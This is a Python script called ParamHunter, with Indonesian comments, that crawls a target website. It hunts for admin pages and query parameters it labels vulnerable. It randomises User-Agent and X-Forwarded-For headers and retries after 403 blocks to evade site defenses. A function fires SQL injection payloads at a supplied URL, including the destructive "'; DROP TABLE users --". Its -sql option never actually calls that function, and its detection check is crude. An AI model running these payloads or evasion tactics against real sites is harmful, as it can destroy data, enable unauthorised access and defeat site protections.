import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from random import choice
from collections import deque
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import re
import string
import random
import time

console = Console()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
]

extra_headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

# Fungsi untuk ngecek kerentanannya SQL injection
def test_sql_injection(url):
    payloads = [
        "' OR 1=1 --",      # SQL injection basic
        "' UNION SELECT NULL, NULL, NULL --",  # SQL union injection
        "' AND 1=1 --",      # Another basic SQL injection
        "' OR 'a'='a",      # Another form of SQL injection
        "'; DROP TABLE users --"  # SQL injection yang lebih berbahaya
    ]
    
    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url)
            if response.status_code == 200 and "error" in response.text.lower():
                console.print(f"[bold red]Potensial SQL Injection ditemukan di: {full_url}[/bold red]")
            else:
                console.print(f"[bold green]Aman: {full_url}[/bold green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[yellow][ERROR] Gagal akses {full_url}: {e}[/yellow]")

# Fungsi untuk menampilkan menu SQL scan
def sql_scan_menu():
    console.print("[bold blue]Menu SQL Injection Scan[/bold blue]")
    console.print("[yellow]Masukkan URL yang ingin di-scan untuk SQL injection:[/yellow]")
    url = input("[bold cyan]URL: [/bold cyan]")
    
    if not url.startswith(("http://", "https://")):
        console.print("[red]URL harus diawali dengan http:// atau https://[/red]")
        return
    
    console.print("[bold yellow]Memulai scan SQL Injection...[/bold yellow]")
    test_sql_injection(url)

def generate_random_parameter(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def make_request(url, base_url):
    """Request dengan random User-Agent, retry jika gagal tanpa proxy"""
    for _ in range(3):  # Maksimal 3 kali percobaan
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': base_url,
                **extra_headers,
            }
            headers['X-Forwarded-For'] = '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))  # IP random
            response = requests.get(url, timeout=15, headers=headers)

            if response.status_code == 403:
                console.log(f"[red][403 Forbidden] Mengakses ulang: {url}")
                time.sleep(random.randint(5, 10))  # Delay untuk menghindari block
                continue

            response.raise_for_status()  # Cek status selain 200 OK
            return response
        except requests.exceptions.RequestException as e:
            console.log(f"[yellow][ERROR] Gagal akses {url}: {e}")
            time.sleep(random.randint(5, 10))  # Delay sebelum retry
    return None

def has_query_parameter(url):
    return '?' in url and '=' in url

def crawl_website(base_url, filters, random_search=False, af_search=False, pr_search=False):
    visited = set()
    queue = deque([base_url])
    matching_urls = []

    if random_search:
        filters.extend([generate_random_parameter() for _ in range(3)])
        console.print("[bold yellow][INFO] Menggunakan parameter random untuk pencarian.[/bold yellow]")

    if af_search:
        admin_paths = [
            '/admin', '/admin.php', '/administrator', '/adminarea', '/wp-admin', '/cpanel',
            '/admin-login', '/adminpanel', '/admin-dashboard', '/controlpanel', '/login', '/admin_login'
        ]
        filters.extend(admin_paths)
        console.print("[bold yellow][INFO] Mencari admin finder dengan filter yang relevan.[/bold yellow]")

    if pr_search:
        pr_filters = ['?id=', '?page=', '?search=', '?category=', '?product=', '?lang=', 'page?', '?keyword=']
        filters.extend(pr_filters)
        console.print("[bold yellow][INFO] Mencari parameter rentan dengan filter: pr.[/bold yellow]")

    while queue:
        current_url = queue.popleft()  # Ambil URL dari deque
        if current_url in visited:
            continue

        console.log(f"[blue][SCAN] Memeriksa: {current_url}")
        response = make_request(current_url, base_url)
        if not response:
            continue

        visited.add(current_url)

        soup = BeautifulSoup(response.text, 'html.parser')
        new_urls = []

        for link in soup.find_all('a', href=True):
            full_url = urljoin(base_url, link['href'])
            parsed_url = urlparse(full_url)

            if parsed_url.netloc == urlparse(base_url).netloc:
                if full_url not in visited and full_url not in queue:
                    new_urls.append(full_url)

                for filter_type in filters:  # Di sini 'filters' harus digunakan
                    if filter_type and isinstance(filter_type, str):  # Pastikan filter_type valid
                        try:
                            # Perbaiki regex agar dapat menangani parameter filter dengan aman
                            if re.search(f"{re.escape(filter_type)}$", full_url):
                                if full_url not in matching_urls:
                                    matching_urls.append(full_url)
                                break
                        except re.error as e:
                            console.print(f"[bold red][ERROR] Kesalahan regex: {e}[/bold red]")
                            continue

        queue.extend(new_urls)

    console.print("\n[bold green][HASIL] URL yang ditemukan By Ren-Xploit:[/bold green]")
    if matching_urls:
        table = Table(title="Matching URLs", show_lines=True)
        table.add_column("No", justify="center", style="cyan", no_wrap=True)
        table.add_column("URL", justify="left", style="magenta")
        for i, url in enumerate(matching_urls, 1):
            table.add_row(str(i), url)
        console.print(table)
    else:
        console.print("[yellow][INFO] Tidak ada URL yang cocok ditemukan.[/yellow]")

def show_help():
    console.print(Panel.fit("""
[bold yellow]Selamat Datang di tools ParamHunter By RenXploit:[/bold yellow]
[bold yellow]Cara Penggunaan:[/bold yellow]
python ParamHunter.py [bold cyan]URL[/bold cyan] -f [bold cyan]FILTER[/bold cyan]

[bold yellow]Contoh Penggunaan normal:[/bold yellow]
python ParamHunter.py https://example.com -f .php

[bold yellow]Contoh Penggunaan admin finder:[/bold yellow]
python ParamHunter https://example.com -f -af

[bold yellow]Contoh Penggunaan Parameter Rentan Work 7/10:[/bold yellow]
python ParamHunter https://example.com -f .php -pr


[bold yellow]Jenis Parameter yang Didukung:[/bold yellow]
- .php
- .html
- .asp
- .jsp
- .aspx
- .json
- .xml
- .txt
- .js
- dan lainnya...

[bold yellow]Fitur Tambahan:[/bold yellow]
- Random User-Agent
- Menghindari Forbidden (403)
- Tampilan hasil dalam tabel
- Deteksi URL yang valid secara otomatis
- Pencarian parameter random (seperti dorking) dengan [bold cyan]-random[/bold cyan]
- Pencarian Admin Finder dengan [bold cyan]-af[/bold cyan]
- Pencarian Parameter Rentan dengan [bold cyan]-pr[/bold cyan]

[bold yellow]Pilihan Argumen:[/bold yellow]
-h, --help : Menampilkan panduan interaktif
-f, --filter : Menentukan filter parameter yang akan dicari
-random : Mencari parameter secara random (dorking)
-af : Mencari halaman admin (admin finder)
-pr : Mencari parameter rentan
    """, title="[bold blue]ParamHunter - Help[/bold blue]", border_style="bold green"))

def main():
    parser = argparse.ArgumentParser(
        description="Script untuk mencari parameter di website dengan filter yang sangat keren dan valid."
    )
    parser.add_argument("url", nargs="?", help="URL target (contoh: https://example.com)")
    parser.add_argument("-f", "--filter", nargs="*", help="Jenis parameter yang dicari (contoh: .php .html .json)")
    parser.add_argument("-random", action="store_true", help="Menggunakan filter random otomatis (dorking)")
    parser.add_argument("-af", action="store_true", help="Mencari halaman admin (admin finder)")
    parser.add_argument("-pr", action="store_true", help="Mencari parameter rentan")
    parser.add_argument("-sql", action="store_true", help="Mencari kerentanannya SQL Injection")  # Tambahkan ini

    args = parser.parse_args()

    if not args.url or (not args.filter and not args.random and not args.af and not args.pr and not args.sql):
        show_help()
        return

    # Validasi input URL
    if not args.url.startswith(("http://", "https://")):
        console.print("[red][ERROR] Masukkan URL yang valid dengan http:// atau https://[/red]")
        return

    filters = args.filter if args.filter else []

    # Tambahkan filter random jika argumen -random digunakan
    if args.random:
        random_filters = [
            f"/{generate_random_parameter()}.json",
            f"/{generate_random_parameter()}.jsp",
            f"/{generate_random_parameter()}.xml",
            f"/{generate_random_parameter()}.php",
            f"/{generate_random_parameter()}.txt",
            f"/{generate_random_parameter()}.html",
        ]
        filters.extend(random_filters)
        console.print(f"[bold yellow][INFO] Menggunakan filter random otomatis: {', '.join(random_filters)}[/bold yellow]")

    # Tambahkan filter admin finder jika -af digunakan
    if args.af:
        admin_paths = [
            '/admin', '/admin.php', '/administrator', '/adminarea', '/wp-admin', '/cpanel',
            '/admin-login', '/adminpanel', '/admin-dashboard', '/controlpanel', '/login', '/admin_login'
        ]
        filters.extend(admin_paths)
        console.print("[bold yellow][INFO] Menggunakan filter admin finder.[/bold yellow]")

    # Tambahkan filter parameter rentan jika -pr digunakan
    if args.pr:
        pr_filters = ['?id=', '?page=', '?search=', '?category=', '?product=', '?lang=', '?keyword=']
        filters.extend(pr_filters)
        console.print("[bold yellow][INFO] Menggunakan filter parameter rentan.[/bold yellow]")

    # Menambahkan logika untuk SQL Injection jika -sql digunakan
    if args.sql:
        sql_filters = ['?id=', '?page=', '?search=', '?category=', '?product=', '?lang=', '?keyword=']
        filters.extend(sql_filters)
        console.print("[bold yellow][INFO] Menggunakan filter untuk mencari kerentanannya SQL Injection.[/bold yellow]")

    # Mulai proses crawling
    console.print(f"[bold green][INFO] Memulai crawling untuk: {args.url}[/bold green]")
    crawl_website(args.url, filters, random_search=args.random, af_search=args.af, pr_search=args.pr)


if __name__ == "__main__":
    main()
